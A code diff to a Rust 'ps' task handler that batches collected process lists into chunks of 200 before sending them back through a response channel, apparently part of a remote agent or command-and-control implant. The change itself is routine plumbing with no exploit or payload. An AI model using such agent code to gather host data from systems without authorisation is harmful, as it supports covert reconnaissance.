@@ -41,24 +41,42 @@ pub async fn execute(task: Task) {
 
     match result {
         Ok(Ok(processes)) => {
-            utils::print_debug(&format!("ps: collected {} processes", processes.len()));
-            response.user_output = format!("Collected {} processes", processes.len());
-            response.processes = Some(processes);
-            response.completed = true;
+            let total = processes.len();
+            utils::print_debug(&format!("ps: collected {} processes", total));
+
+            // Send processes in batches to avoid 413 Payload Too Large from proxies.
+            // Each batch carries a chunk of the structured process data.
+            const BATCH_SIZE: usize = 200;
+            let chunks: Vec<Vec<ProcessDetails>> = processes
+                .chunks(BATCH_SIZE)
+                .map(|c| c.to_vec())
+                .collect();
+            let num_chunks = chunks.len();
+
+            for (i, chunk) in chunks.into_iter().enumerate() {
+                let mut batch_response = task.new_response();
+                let is_last = i == num_chunks - 1;
+                if is_last {
+                    batch_response.user_output = format!("Collected {} processes", total);
+                    batch_response.completed = true;
+                }
+                batch_response.processes = Some(chunk);
+                let _ = task.job.send_responses.send(batch_response).await;
+            }
         }
         Ok(Err(e)) => {
             utils::print_debug(&format!("ps: spawn_blocking panicked: {:?}", e));
             response.set_error(&format!("Failed to collect processes: {:?}", e));
+            let _ = task.job.send_responses.send(response).await;
         }
         Err(_) => {
             utils::print_debug("ps: timed out after 30 seconds");
             response.set_error("Process listing timed out after 30 seconds");
+            let _ = task.job.send_responses.send(response).await;
         }
     }
 
-    utils::print_debug("ps: sending response");
-    let _ = task.job.send_responses.send(response).await;
-    utils::print_debug("ps: response sent, removing task");
+    utils::print_debug("ps: removing task");
     let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
     utils::print_debug("ps: done");
 }
